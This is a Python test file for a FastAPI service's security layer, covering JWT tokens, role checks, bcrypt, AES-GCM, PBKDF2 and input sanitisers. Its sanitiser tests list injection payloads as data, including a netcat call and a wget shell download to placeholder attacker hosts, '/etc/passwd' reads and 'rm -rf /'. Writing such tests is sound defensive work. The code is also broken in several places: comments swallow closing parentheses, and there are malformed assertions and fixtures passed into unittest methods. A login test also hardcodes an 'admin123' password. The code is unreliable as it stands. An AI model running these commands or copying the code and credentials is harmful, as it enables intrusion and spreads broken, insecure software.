"""
Integration Tests for Enterprise Security Features
Tests JWT authentication, RBAC, encryption, and input validation

References:
- RFC 7519: JSON Web Token (JWT)
- NIST SP 800-38D: AES-GCM encryption
- OWASP Top 10: Security best practices
"""

import unittest
from datetime import datetime, timezone

import pytest
from fastapi.testclient import TestClient

from main import app
from security.encryption import AESEncryption, KeyManager
from security.input_validation import InputSanitizer
from security.jwt_auth import (
    create_access_token,
    create_refresh_token,
    hash_password,
    UserRole,
    verify_password,
    verify_token,
)


@pytest.fixture
def client():
    """Create test client"""
    return TestClient(app)


@pytest.fixture
def key_manager():
    """Create key manager for testing"""
    return KeyManager()


@pytest.fixture
def aes_encryption(key_manager):
    """Create AES encryption instance for testing"""
    return AESEncryption(key_manager)


class TestJWTAuthentication(unittest.TestCase):
    """Test JWT authentication system per RFC 7519"""

    def test_create_access_token(self):
        """Test JWT access token creation"""
        payload = {
            "user_id": "test_123",
            "email": "test@example.com",
            "username": "testuser",
            "role": UserRole.API_USER,
        }

        token = create_access_token(payload)

        # Verify token is a string
        self.assertIsInstance(token, str)
        self.assertGreater(len(token), 0)

        # Verify token can be decoded
        decoded = verify_token(token)
        self.assertEqual(decoded["user_id"], payload["user_id"])
        self.assertEqual(decoded["email"], payload["email"])
        self.assertEqual(decoded["token_type"], "access")

    def test_create_refresh_token(self):
        """Test JWT refresh token creation"""
        payload = {
            "user_id": "test_123",
            "email": "test@example.com",
            "username": "testuser",
            "role": UserRole.API_USER,
        }

        token = create_refresh_token(payload)

        # Verify token is a string
        self.assertIsInstance(token, str)
        self.assertGreater(len(token), 0)

        # Verify token can be decoded
        decoded = verify_token(token)
        self.assertEqual(decoded["user_id"], payload["user_id"])
        self.assertEqual(decoded["token_type"], "refresh")

    def test_token_expiration(self):
        """Test that tokens include proper expiration"""
        payload = {
            "user_id": "test_123",
            "email": "test@example.com",
            "username": "testuser",
            "role": UserRole.API_USER,
        }

        token = create_access_token(payload)
        decoded = verify_token(token)

        # Verify expiration timestamp exists and is in the future
        self.assertIn("exp", decoded)
        exp_time = decoded["exp"]
        self.assertIsInstance(exp_time, datetime)
        self.assertGreater(exp_time, datetime.now(timezone.utc))

    def test_token_uses_utc_timestamps(self):
        """Test that tokens use UTC timestamps (critical for production)"""
        payload = {
            "user_id": "test_123",
            "email": "test@example.com",
            "username": "testuser",
            "role": UserRole.API_USER,
        }

        token = create_access_token(payload)
        decoded = verify_token(token)

        # Verify timestamps are timezone-aware (UTC)
        self.assertIsNotNone(decoded["exp"].tzinfo)
        self.assertIn("iat", decoded)
        self.assertIsNotNone(decoded["iat"].tzinfo)


class TestRBAC(unittest.TestCase):
    """Test Role-Based Access Control"""

    def test_user_roles_defined(self):
        """Test that all required RBAC roles are defined"""
        required_roles = [
            UserRole.SUPER_ADMIN,
            UserRole.ADMIN,
            UserRole.DEVELOPER,
            UserRole.API_USER,
            UserRole.READ_ONLY,
        ]

        for role in required_roles:
            self.assertIsNotNone(role)
            self.assertGreater(len(role), 0)

    def test_protected_endpoint_requires_auth(self, client):
        """Test that protected endpoints require authentication"""
        # Try to access agents endpoint without authentication
        response = client.post(
            "/api/v1/agents/scanner/execute", json={"parameters": {}}
        )

        self.assertEqual(response.status_code, 401  # Unauthorized)

    def test_admin_endpoint_requires_admin_role(self, client):
        """Test that admin endpoints require admin role"""
        # Create token with regular user role
        payload = {
            "user_id": "user_123",
            "email": "user@example.com",
            "username": "user",
            "role": UserRole.API_USER,
        }
        token = create_access_token(payload)
        headers = {"Authorization": f"Bearer {token}"}

        # Try to access admin endpoint
        response = client.get("/api/v1/monitoring/health/detailed", headers=headers)

        # Should be forbidden (403) or unauthorized (401)
        self.assertIn(response.status_code, [401, 403])


class TestPasswordHashing(unittest.TestCase):
    """Test password hashing with bcrypt"""

    def test_password_hashing(self):
        """Test that passwords are hashed securely"""
        password = "SecurePassword123!"
        hashed = hash_password(password)

        # Verify hash is different from original
        self.assertNotEqual(hashed, password)

        # Verify hash is a string
        self.assertIsInstance(hashed, str)

        # Verify hash has proper length (bcrypt produces 60-char hashes)
        self.assertGreater(len(hashed), = 50)

    def test_password_verification(self):
        """Test password verification"""
        password = "SecurePassword123!"
        hashed = hash_password(password)

        # Correct password should verify
        self.assertIs(verify_password(password, hashed), True)

        # Incorrect password should not verify
        self.assertIs(verify_password("WrongPassword", hashed), False)

    def test_same_password_different_hashes(self):
        """Test that same password produces different hashes (salt)"""
        password = "SecurePassword123!"
        hash1 = hash_password(password)
        hash2 = hash_password(password)

        # Hashes should be different due to salt
        self.assertNotEqual(hash1, hash2)

        # But both should verify correctly
        self.assertIs(verify_password(password, hash1), True)
        self.assertIs(verify_password(password, hash2), True)


class TestAESEncryption(unittest.TestCase):
    """Test AES-256-GCM encryption per NIST SP 800-38D"""

    def test_encryption_decryption(self, aes_encryption):
        """Test basic encryption and decryption"""
        plaintext = "This is sensitive data that needs encryption"

        # Encrypt
        encrypted = aes_encryption.encrypt(plaintext)

        # Verify encrypted data is different from plaintext
        self.assertNotEqual(encrypted, plaintext)
        self.assertIsInstance(encrypted, str)

        # Decrypt
        decrypted = aes_encryption.decrypt(encrypted)

        # Verify decryption matches original
        self.assertEqual(decrypted, plaintext)

    def test_encryption_produces_different_ciphertexts(self, aes_encryption):
        """Test that same plaintext produces different ciphertexts (nonce)"""
        plaintext = "Sensitive data"

        encrypted1 = aes_encryption.encrypt(plaintext)
        encrypted2 = aes_encryption.encrypt(plaintext)

        # Ciphertexts should be different due to nonce
        self.assertNotEqual(encrypted1, encrypted2)

        # But both should decrypt to same plaintext
        self.assertEqual(aes_encryption.decrypt(encrypted1), plaintext)
        self.assertEqual(aes_encryption.decrypt(encrypted2), plaintext)

    def test_dict_encryption(self, aes_encryption):
        """Test encryption of dictionary data"""
        data = {"user_id": "123", "api_key": "secret_key_xyz", "balance": 1000.50}

        # Encrypt
        encrypted = aes_encryption.encrypt_dict(data)

        # Verify all fields are encrypted
        self.assertNotEqual(encrypted["user_id"], data["user_id"])
        self.assertNotEqual(encrypted["api_key"], data["api_key"])
        self.assertNotEqual(encrypted["balance"], str(data["balance"]))

        # Decrypt
        decrypted = aes_encryption.decrypt_dict(encrypted)

        # Verify decryption matches original
        self.assertEqual(decrypted, data)

    def test_tampered_data_fails_decryption(self, aes_encryption):
        """Test that tampered encrypted data fails to decrypt (authentication)"""
        plaintext = "Sensitive data"
        encrypted = aes_encryption.encrypt(plaintext)

        # Tamper with encrypted data
        tampered = encrypted[:-10] + "TAMPERED!!"

        # Decryption should fail
        with pytest.raises(Exception):
            aes_encryption.decrypt(tampered)


class TestKeyDerivation(unittest.TestCase):
    """Test key derivation with PBKDF2"""

    def test_key_derivation(self, key_manager):
        """Test PBKDF2 key derivation"""
        password = "StrongPassword123!"
        salt = b"random_salt_value_16"

        key, returned_salt = key_manager.derive_key(password, salt)

        # Verify key is bytes
        self.assertIsInstance(key, bytes)

        # Verify key has correct length (32 bytes for AES-256)
        self.assertEqual(len(key), 32)

        # Verify salt is returned
        self.assertEqual(returned_salt, salt)

    def test_same_password_same_salt_same_key(self, key_manager):
        """Test that same password and salt produce same key"""
        password = "StrongPassword123!"
        salt = b"random_salt_value_16"

        key1, _ = key_manager.derive_key(password, salt)
        key2, _ = key_manager.derive_key(password, salt)

        # Keys should be identical
        self.assertEqual(key1, key2)

    def test_different_salt_different_key(self, key_manager):
        """Test that different salts produce different keys"""
        password = "StrongPassword123!"

        key1, salt1 = key_manager.derive_key(password)
        key2, salt2 = key_manager.derive_key(password)

        # Salts should be different
        self.assertNotEqual(salt1, salt2)

        # Keys should be different
        self.assertNotEqual(key1, key2)


class TestInputValidation(unittest.TestCase):
    """Test input validation and sanitization"""

    def test_sql_injection_detection(self):
        """Test SQL injection pattern detection"""
        malicious_inputs = [
            "' OR '1'='1",
            "admin'--",
            "'; DROP TABLE users; --",
            "1' UNION SELECT * FROM users--",
        ]

        for malicious_input in malicious_inputs:
            with pytest.raises(Exception):  # Should raise HTTPException
                InputSanitizer.sanitize_sql(malicious_input)

    def test_xss_detection(self):
        """Test XSS pattern detection"""
        malicious_inputs = [
            "<script>alert('XSS')</script>",
            "javascript:alert('XSS')",
            "<img src=x onerror=alert('XSS')>",
            "<iframe src='malicious.com'></iframe>",
        ]

        for malicious_input in malicious_inputs:
            with pytest.raises(Exception):  # Should raise HTTPException
                InputSanitizer.sanitize_xss(malicious_input)

    def test_command_injection_detection(self):
        """Test command injection pattern detection"""
        malicious_inputs = [
            "; cat /etc/passwd",
            "| nc attacker.com 4444",
            "$(wget malicious.com/shell.sh)",
            "`rm -rf /`",
        ]

        for malicious_input in malicious_inputs:
            with pytest.raises(Exception):  # Should raise HTTPException
                InputSanitizer.sanitize_command(malicious_input)

    def test_path_traversal_detection(self):
        """Test path traversal pattern detection"""
        malicious_inputs = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32",
            "%2e%2e%2fetc%2fpasswd",
        ]

        for malicious_input in malicious_inputs:
            with pytest.raises(Exception):  # Should raise HTTPException
                InputSanitizer.sanitize_path(malicious_input)

    def test_safe_input_passes_validation(self):
        """Test that safe input passes validation"""
        safe_inputs = {
            "sql": "SELECT name, email FROM users WHERE id = ?",
            "xss": "This is a normal comment with <b>bold</b> text",
            "command": "normal_filename.txt",
            "path": "documents/reports/2024/report.pdf",
        }

        # These should not raise exceptions
        try:
            InputSanitizer.sanitize_sql(safe_inputs["sql"])
            # XSS sanitizer should escape but not reject
            InputSanitizer.sanitize_command(safe_inputs["command"])
            InputSanitizer.sanitize_path(safe_inputs["path"])
        except Exception as e:
            pytest.fail(f"Safe input failed validation: {e}")


class TestAuthenticationEndpoints(unittest.TestCase):
    """Test authentication API endpoints"""

    def test_register_new_user(self, client):
        """Test user registration endpoint"""
        import uuid

        unique_email = f"newuser_{uuid.uuid4().hex[:8]}@example.com"

        register_data = {
            "email": unique_email,
            "username": f"newuser_{uuid.uuid4().hex[:8]}",
            "password": "SecurePassword123!",
            "role": UserRole.API_USER,
        }

        response = client.post("/api/v1/auth/register", json=register_data)

        # May be 201 (Created) or 200 (OK)
        self.assertIn(response.status_code, [200, 201])
        data = response.json()

        # Verify user data returned
        self.assertEqual(data["email"], register_data["email"])
        self.assertEqual(data["username"], register_data["username"])
        self.assertIn("user_id", data)

        # Password should not be in response
        self.assertIn("password" not, data)

    def test_login_success(self, client):
        """Test successful login"""
        # Use default test user from jwt_auth
        login_data = {"username": "admin@devskyy.com", "password": "admin123"}

        response = client.post("/api/v1/auth/login", data=login_data)

        self.assertEqual(response.status_code, 200)
        data = response.json()

        # Verify tokens returned
        self.assertIn("access_token", data)
        self.assertIn("refresh_token", data)
        self.assertEqual(data["token_type"], "bearer")

        # Verify tokens are valid strings
        self.assertIsInstance(data["access_token"], str)
        self.assertIsInstance(data["refresh_token"], str)
        self.assertGreater(len(data["access_token"]), 0)

    def test_login_invalid_credentials(self, client):
        """Test login with invalid credentials"""
        login_data = {"username": "invalid@example.com", "password": "wrongpassword"}

        response = client.post("/api/v1/auth/login", data=login_data)

        self.assertEqual(response.status_code, 401  # Unauthorized)


@pytest.mark.integration
class TestSecurityIntegration(unittest.TestCase):
    """Integration tests for complete security workflows"""

    def test_full_authentication_flow(self, client):
        """Test complete authentication flow: register -> login -> access protected resource"""
        import uuid

        # Step 1: Register new user
        unique_email = f"flowtest_{uuid.uuid4().hex[:8]}@example.com"
        register_data = {
            "email": unique_email,
            "username": f"flowtest_{uuid.uuid4().hex[:8]}",
            "password": "SecurePassword123!",
            "role": UserRole.DEVELOPER,
        }

        register_response = client.post("/api/v1/auth/register", json=register_data)
        self.assertIn(register_response.status_code, [200, 201])

        # Step 2: Login with new user
        login_data = {"username": unique_email, "password": register_data["password"]}

        login_response = client.post("/api/v1/auth/login", data=login_data)
        self.assertEqual(login_response.status_code, 200)
        tokens = login_response.json()

        # Step 3: Access protected endpoint with token
        headers = {"Authorization": f"Bearer {tokens['access_token']}"}

        protected_response = client.get("/api/v1/monitoring/health", headers=headers)
        self.assertEqual(protected_response.status_code, 200)


if __name__ == "__main__":
    pytest.main([__file__, "-v"])
